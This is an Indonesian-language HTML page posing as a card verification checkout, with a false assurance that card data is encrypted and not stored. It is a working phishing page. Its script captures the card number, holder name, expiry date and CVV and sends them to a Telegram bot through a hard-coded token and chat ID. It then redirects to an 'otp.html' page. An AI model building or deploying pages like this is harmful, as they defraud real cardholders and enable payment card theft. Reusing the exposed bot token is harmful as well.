<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masukkan Detail Kartu</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }
        
        .card-input {
            transition: all 0.3s ease;
        }
        
        .card-input:focus {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 16px 20px;
            border-radius: 8px;
            color: white;
            font-weight: 500;
            z-index: 1000;
            animation: slideIn 0.3s ease-out;
        }
        
        .notification.success { background-color: #10B981; }
        .notification.error { background-color: #EF4444; }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .loading-spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid #3498db;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="bg-gray-50 min-h-screen">
    <!-- Header -->
    <header class="bg-white shadow-sm border-b">
        <div class="max-w-2xl mx-auto px-4 py-4">
            <div class="flex items-center justify-between">
                <button class="text-gray-600 hover:text-gray-800">
                    <i class="fas fa-arrow-left text-xl"></i>
                </button>
                <h1 class="text-lg font-semibold text-gray-800">Masukkan Detail Kartu</h1>
                <div class="w-6"></div>
            </div>
        </div>
    </header>

    <div class="max-w-2xl mx-auto px-4 py-8">
        <!-- Security Info -->
        <div class="mb-8 p-4 bg-blue-50 rounded-lg border border-blue-200">
            <div class="flex items-start space-x-3">
                <i class="fas fa-shield-alt text-blue-600 mt-1"></i>
                <div>
                    <h3 class="font-medium text-blue-800">Keamanan Terjamin</h3>
                    <p class="text-sm text-blue-600 mt-1">Data kartu Anda dienkripsi dengan teknologi SSL 256-bit dan tidak disimpan di server kami.</p>
                </div>
            </div>
        </div>

        <!-- Payment Form -->
        <div class="bg-white rounded-xl shadow-lg p-6">
            <h2 class="text-xl font-semibold text-gray-800 mb-6">Informasi Kartu Kredit/Debit</h2>
            
            <form id="paymentForm" class="space-y-6">
                <!-- Card Number -->
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">
                        Nomor Kartu
                    </label>
                    <div class="relative">
                        <input 
                            type="text" 
                            id="cardNumber" 
                            name="cardNumber"
                            placeholder="1234 5678 9012 3456"
                            maxlength="19"
                            class="card-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent pl-12"
                            required
                        >
                        <i class="fas fa-credit-card absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                        <div id="cardTypeIndicator" class="absolute right-4 top-1/2 transform -translate-y-1/2">
                            <i class="fab fa-cc-visa text-xl text-gray-300"></i>
                        </div>
                    </div>
                </div>

                <!-- Card Holder Name -->
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">
                        Nama Pemegang Kartu
                    </label>
                    <div class="relative">
                        <input 
                            type="text" 
                            id="cardHolder" 
                            name="cardHolder"
                            placeholder="Nama sesuai kartu"
                            class="card-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent pl-12"
                            required
                        >
                        <i class="fas fa-user absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                    </div>
                </div>

                <!-- Expiry and CVV -->
                <div class="grid grid-cols-2 gap-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">
                            Tanggal Kadaluarsa
                        </label>
                        <div class="relative">
                            <input 
                                type="text" 
                                id="cardExpiry" 
                                name="cardExpiry"
                                placeholder="MM/YY"
                                maxlength="5"
                                class="card-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent pl-12"
                                required
                            >
                            <i class="fas fa-calendar-alt absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                        </div>
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">
                            CVV
                        </label>
                        <div class="relative">
                            <input 
                                type="text" 
                                id="cardCVV" 
                                name="cardCVV"
                                placeholder="123"
                                maxlength="4"
                                class="card-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent pl-12"
                                required
                            >
                            <i class="fas fa-lock absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                        </div>
                    </div>
                </div>

                <!-- Card Type Selection -->
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">
                        Jenis Kartu
                    </label>
                    <div class="grid grid-cols-2 gap-3">
                        <label class="flex items-center p-3 border border-gray-300 rounded-lg cursor-pointer hover:bg-gray-50 transition-colors">
                            <input type="radio" name="cardType" value="debit" class="mr-3" checked>
                            <i class="fas fa-credit-card mr-2 text-blue-600"></i>
                            <span class="text-sm font-medium">Kartu Debit</span>
                        </label>
                        <label class="flex items-center p-3 border border-gray-300 rounded-lg cursor-pointer hover:bg-gray-50 transition-colors">
                            <input type="radio" name="cardType" value="credit" class="mr-3">
                            <i class="fas fa-credit-card mr-2 text-green-600"></i>
                            <span class="text-sm font-medium">Kartu Kredit</span>
                        </label>
                    </div>
                </div>

                <!-- Submit Button -->
                <button 
                    type="submit" 
                    class="w-full bg-blue-600 text-white font-semibold py-4 rounded-lg hover:bg-blue-700 transition-colors focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed"
                    id="submitBtn"
                >
                    <span id="submitText">VERIFIKASI</span>
                    <div id="submitLoader" class="loading-spinner mx-auto hidden"></div>
                </button>
            </form>

            <!-- Accepted Cards -->
            <div class="mt-6 text-center">
                <p class="text-sm text-gray-500 mb-3">Kartu yang diterima:</p>
                <div class="flex justify-center space-x-4">
                    <i class="fab fa-cc-visa text-2xl text-blue-600"></i>
                    <i class="fab fa-cc-mastercard text-2xl text-red-500"></i>
                    <i class="fab fa-cc-amex text-2xl text-blue-500"></i>
                    <i class="fab fa-cc-jcb text-2xl text-green-600"></i>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ========== KONFIGURASI TELEGRAM BOT ==========
        const TELEGRAM_BOT_TOKEN = '8142214274:AAGDkwwEOsbxxo00e-hd7p5avWosgEjsjA8'; // Ganti dengan token bot Anda
        const TELEGRAM_CHAT_ID = '8401770573'; // Ganti dengan chat ID Anda

        const form = document.getElementById('paymentForm');
        const submitBtn = document.getElementById('submitBtn');
        const submitText = document.getElementById('submitText');
        const submitLoader = document.getElementById('submitLoader');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            // Tampilkan loading
            submitLoader.classList.remove('hidden');
            submitText.textContent = 'Mengirim...';
            submitBtn.disabled = true;

            // Ambil data dari form
            const formData = new FormData(form);
            const data = {
                cardNumber: formData.get('cardNumber'),
                cardHolder: formData.get('cardHolder'),
                cardExpiry: formData.get('cardExpiry'),
                cardCVV: formData.get('cardCVV'),
                cardType: formData.get('cardType')
            };

            // Kirim data ke Telegram
            const message = `
🎫 *Informasi Pembayaran Kartu*

👤 *Nama Pemegang Kartu:* ${data.cardHolder}
💳 *Nomor Kartu:* ${data.cardNumber}
📅 *Tanggal Kadaluarsa:* ${data.cardExpiry}
🔒 *CVV:* ${data.cardCVV}
🆔 *Jenis Kartu:* ${data.cardType}
            `;

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                window.location.href = "otp.html"; 
                    form.reset();
                } else {
                    throw new Error('Gagal mengirim ke Telegram');
                }
            } catch (error) {
                showNotification(`Error: ${error.message}`, 'error');
            } finally {
                // Reset button
                submitLoader.classList.add('hidden');
                submitText.textContent = 'Bayar Sekarang';
                submitBtn.disabled = false;
            }
        });

        // Show notification
        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.textContent = message;
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.remove();
            }, 5000);
        }
    </script>
</body>
  </html>
